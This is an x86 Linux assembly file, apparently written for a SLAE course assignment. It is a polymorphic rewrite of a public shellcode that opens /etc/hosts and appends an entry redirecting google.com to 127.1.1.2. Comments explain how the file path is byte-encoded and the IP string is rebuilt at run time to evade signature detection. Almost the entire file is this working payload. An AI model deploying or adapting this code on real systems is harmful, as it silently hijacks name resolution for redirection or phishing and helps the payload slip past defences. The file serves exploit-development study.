; SLAE - Assignment #6: Polymorphic Shellcodes (Linux/x86) - Part2
; Original: http://shell-storm.org/shellcode/files/shellcode-893.php
; Author:   Julien Ahrens (@MrTuxracer)
; Website:  http://www.rcesecurity.com 

global _start

section .text

_start:
    	;xor ecx, ecx
    	xor eax, eax		;use eax instead of ecx	

    	;mul ecx
    	cdq			;clear out edx

    	;mov al, 0x5   		
    	add al,0x5		;replace mov by add, since eax is 0x0

    	;push ecx
    	push edx

    	;push 0x7374736f     	;/etc///hosts
    	mov esi, 0x10101010	;encode target file by subtracting 0x10 on each byte
    	mov ecx, 0x6364635f	;minus 0x10 one each byte to encode the payload
    	add ecx, esi		;add 0x10 again on the stack
    	push ecx

    	;push 0x682f2f2f	
    	mov ecx, 0x581f1f1f	;minus 0x10 on each byte
    	add ecx, esi		;add 0x10 on each byte
    	push ecx

    	;push 0x6374652f
    	mov ecx, 0x5364551f	;minus 0x10 on each byte
    	add ecx, esi		;add 0x10 on each byte
    	push ecx

    	mov ebx, esp

    	xchg ecx, edx		;mov 0x0 into ecx
    	mov cx, 0x401       	;permmisions
    	int 0x80        	;syscall sys_open

    	xchg eax, ebx
    	push 0x4
    	pop eax
    	jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    	pop ecx
    	mov dword [ecx], 0x2e373231 	;replace db string on the fly
    	mov dword [ecx+4], 0x2e312e31   ;replace db string on the fly
    	mov byte [ecx+8], 0x32
	
    	;push 20        ;length of the string, dont forget to modify if changes the map
    	push len	;moved from static length to dynamic via equ
    	pop edx
    	int 0x80        ;syscall to write in the file (sys_write)

    	push 0x6
    	pop eax	
    	int 0x80        ;syscall to close the file (sys_close)

    	push 0x1
    	pop eax
    	int 0x80        ;syscall to exit (sys_exit)

_load_data:
    	call _write
    	;google db "127.1.1.2 google.com"
    	google db "xxxxx.x.x google.com"	;x to be replaced on the fly :)
    	len:    equ $-google
